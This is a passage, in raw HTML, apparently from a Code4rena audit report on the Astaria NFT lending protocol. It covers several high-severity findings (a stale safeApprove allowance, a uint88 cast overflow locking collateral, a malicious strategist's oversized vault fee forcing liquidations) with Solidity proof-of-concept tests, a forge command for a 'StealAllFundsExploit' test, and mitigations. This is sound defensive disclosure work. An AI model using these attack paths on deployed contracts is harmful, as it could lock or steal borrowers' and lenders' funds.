ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"3\">\n<li>Then run the forge test command as follows (replace <code>$FORK_URL</code> with your RPC URL):</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sh\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> forge </span><span class=\"mtk11\">test</span><span class=\"mtk1\"> --ffi --fork-url </span><span class=\"mtk12\">$FORK_URL</span><span class=\"mtk1\"> --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv</span></span></span></code></pre>\n<p>The test will pass. I’ve added comments in the code explaining the steps.</p>\n<p><em>Note:The attack isn’t possible when using AstariaRouter</em></p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In VaultImplementation’s <code>commitToLien</code> function, add the following validation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sh\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">require(address(this) == params.lienRequest.strategy.vault,</span><span class=\"mtk8\">&quot;INVALID VAULT&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Run the PoC test above again, and <code>testPayWithDifferentAsset</code> should fail.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/409\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-09-at-the-second-time-the-nft-is-used-as-collateral-to-take-a-loan-the-debt-repayment-via-auction-fund-can-be-failed-when-liquidation-\" style=\"position:relative;\"><a href=\"#h-09-at-the-second-time-the-nft-is-used-as-collateral-to-take-a-loan-the-debt-repayment-via-auction-fund-can-be-failed-when-liquidation-\" aria-label=\"h 09 at the second time the nft is used as collateral to take a loan the debt repayment via auction fund can be failed when liquidation  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/379\">[H-09] At the second time the nft is used as collateral to take a loan, the debt repayment via auction fund can be failed when liquidation </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/379\">KIntern_NA</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143-L146\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143-L146</a></p>\n<p>When a user transfer an NFT to <code>CollateralToken</code> contract, it will toggle the function <code>CollateralToken.onERC721Received()</code>. In this function if there didn’t exist any <code>clearingHouse</code> for the <code>collateralId</code>, it will create a new one for that collateral.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ClonesWithImmutableArgs</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clone</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">BEACON_PROXY_IMPLEMENTATION</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ImplementationType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ClearingHouse</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collateralId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The interesting thing of this technique is: there will be <strong>just one <code>clearingHouse</code></strong> be used for each collateral no matter how many times the collateral is transferred to the contract. Even when the lien is liquidated / fully repayed, the <code>s.clearingHouse[collateralId]</code> remain unchanged.</p>\n<p>The question here is any stale datas in <code>clearingHouse</code> from the previous time that the nft was used as collateral can affect the behavior of protocol when the nft was transfered to CollateralToken again?</p>\n<p>Let take a look at the function <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114\"><code>ClearingHouse._execute()</code></a>. In this function, the implementation uses <code>safeApprove()</code> to approve <code>payment - liquidatorPayment</code> amount for the <code>TRANSFER_PROXY</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">()),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatorPayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>the <code>safeApprove</code> function will revert if the allowance was set from non-zero value to non-zero value. This will incur some potential risk for the function like example below:</p>\n<ol>\n<li>NFT x is transferred to <code>CollateralToken</code> to take loans and then it is liquidated.</li>\n<li>At time 10, function <code>ClearingHouse._execute()</code> was called and the <code>payment - liquidatorPayment > totalDebt</code>. This will the <code>paymentToken.allowance[clearingHouse][TRANSFER_PROXY] > 0</code> after the function ended.</li>\n<li>NFT x is transferred to <code>CollateralToken</code> for the second time to take a loans and then it is liquidated again.</li>\n<li>At time 15 (> 10), function <code>ClearingHouse._execute()</code> was called, but at this time, the <code>safeApprove</code> will revert since the previous allowance is different from 0</li>\n</ol>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The debt can be repayed by auction funds when liquidation.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider to use <code>approve</code> instead of <code>safeApprove</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/379#issuecomment-1404007645\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p>We use the solmate library which doesn’t seem to have a check for approvals being set to 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/379\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-10-liquidation-will-fail-if-value-set-as-liquidationinitialask--288-1-causing-collateral-to-be-permanently-locked\" style=\"position:relative;\"><a href=\"#h-10-liquidation-will-fail-if-value-set-as-liquidationinitialask--288-1-causing-collateral-to-be-permanently-locked\" aria-label=\"h 10 liquidation will fail if value set as liquidationinitialask  288 1 causing collateral to be permanently locked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/375\">[H-10] Liquidation will fail if value set as <code>liquidationInitialAsk</code> > <code>2**88-1</code>, causing collateral to be permanently locked</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/375\">kaden</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/99\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L340\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L340</a></p>\n<p>When a lien is initially created, the <code>liquidationInitialAsk</code> can be set as any uint256 value >= the amount of underlying borrowed. Later on however, if the position is liquidated, an auction is created which casts the <code>liquidationInitialAsk</code> value to a uint88. Taking a look at the function in <code>SafeCastLib.sol</code>, we can see that if the value is greater than the max uint88 value, execution is reverted:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function safeCastTo88(uint256 x) internal pure returns (uint88 y) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(x &lt; 1 &lt;&lt; 88);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  y = uint88(x);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>This reversion prevents auctions from ever being initialized, and since the only way to retrieve the collateral after the loan has expired is through auction, the collateral is permanently locked in the contract.</p>\n<p>For reference, setting the <code>initialLiquidationAsk</code> > <code>309,485,009.8213451</code> DAI would trigger this error, and with a lesser value or higher decimal collateral, this may require a much lower USD equivalent. Additionally, setting a price this high is not particularly unrealistic considering it’s the starting price for a dutch auction in which it should be intentionally priced much higher than it’s worth.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept:</h3>\n<p>We can create the following test in <code>AstariaTest.t.sol</code> to verify:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testCannotLiquidateTooHighInitialAsk() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  TestNFT nft = new TestNFT(3);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  vm.label(address(nft), &quot;nft&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address tokenContract = address(nft);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 tokenId = uint256(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address publicVault = _createPublicVault({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    delegate: strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    epochLength: 14 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Lender({addr: address(1), amountToLend: 50 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    publicVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ILienToken.Stack[] memory stack;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  (, stack) = _commitToLien({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vault: publicVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    strategistPK: strategistOnePK,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokenContract: tokenContract,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokenId: tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    lienDetails: ILienToken.Details({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      maxAmount: 50 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      rate: (uint256(1e16) * 150) / (365 days),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      duration: 10 days,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      maxPotentialDebt: 0 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      liquidationInitialAsk: type(uint256).max</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    amount: 5 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    isFirstLien: true</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 collateralId = tokenContract.computeId(tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  skip(14 days); // end of loan</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  vm.expectRevert();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stack,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint8(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>This can be avoided by using a uint256 as the <code>auctionData.startAmount</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/375\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-11-malicious-strategist-could-deny-borrowers-from-repaying-loan-and-force-liquidation-by-setting-a-extremely-high-vault-fee\" style=\"position:relative;\"><a href=\"#h-11-malicious-strategist-could-deny-borrowers-from-repaying-loan-and-force-liquidation-by-setting-a-extremely-high-vault-fee\" aria-label=\"h 11 malicious strategist could deny borrowers from repaying loan and force liquidation by setting a extremely high vault fee permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/295\">[H-11] Malicious strategist could deny borrowers from repaying loan and force liquidation by setting a extremely high vault fee</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/295\">peakbolt</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/378\">kaden</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/368\">caventa</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471</a></p>\n<p><strong>Issue:</strong> A malicious strategist can deny the repayment of loans by setting a extremely high vault fee during creation of a public vault. The high vault fee will cause a revert due to a failed integer conversion using SafeCastTo88(). This will lead to forced liquidation of the borrowers when the loans expire outstanding, making them lose their NFT collaterals. (Vault fee is an incentive awarded to strategist on each loan repayment,  where a percentage of the interest payment is allocated to the strategist, in terms of vault shares.)</p>\n<p><strong>High Likelihood:</strong> The strategist could target borrowers by refinancing outstanding loans and transfering the loans to his high fee vault, which does not require the borrowers’ consents. This can be achieved as refinancing can be done by anyone and the logic only checks for better interest rate and duration, but not the vault fee. The borrowers will not be aware of the issue, until they attempt to repay the loan. Furthermore, the strategist could specifically target loans that are about to expire, giving little reaction time for borrowers to report the issue.</p>\n<p><strong>Financial gain:</strong> With the ability to force a liquidation, the strategist can possibly stand to gain financially (e.g. by refinancing the loans with a lower liquidationInitialAsk and then bid for the NFT collateral (with high gas fee) during liquidation.</p>\n<p>Note: Even if there are no lenders willing to lend to the vault due to the high vault fee, the strategist still can lend to its own vault to faciliate the refinance.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The bug can be replicated by changing the test case. Set vaultFee parameter to a high value (e.g. 1e13) as shown below in the file /src/test/TestHelpers.t.sol.  Then run testBasicPublicVaultLoan() in AsteriaTest.t.sol. In this test case, we will see that the strategist could create a public vault with a high vaultFee as there is no validation check for it. And any borrower could still proceed to deposit their collateral and take loan without any issues as the vaultFee is only accessed upon loan repayment.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _createPublicVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\taddress strategist,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\taddress delegate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tuint256 epochLength</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) internal returns (address publicVault) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tvm.startPrank(strategist);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t//bps</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tpublicVault = ASTARIA_ROUTER.newPublicVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tepochLength,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tdelegate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress(WETH9),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t//uint256(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tuint256(1e13),              //to replicate the bug, change vaultFee parameter from 0 to a high value like 1e13   </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tfalse,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tnew address[](0),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/AstariaTest.t.sol#L90\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/AstariaTest.t.sol#L90</a></p>\n<p>However, when the borrower attempts to repay the loan, it will revert due to a failed integer conversion. As the fee is too high, convertToShare() will return a value that exceeds 88-bit, causing the safeCastTo88() in _handleStrategistInterestReward() to fail.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint88 feeInShares = convertToShares(fee).safeCastTo88();</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605</a></p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 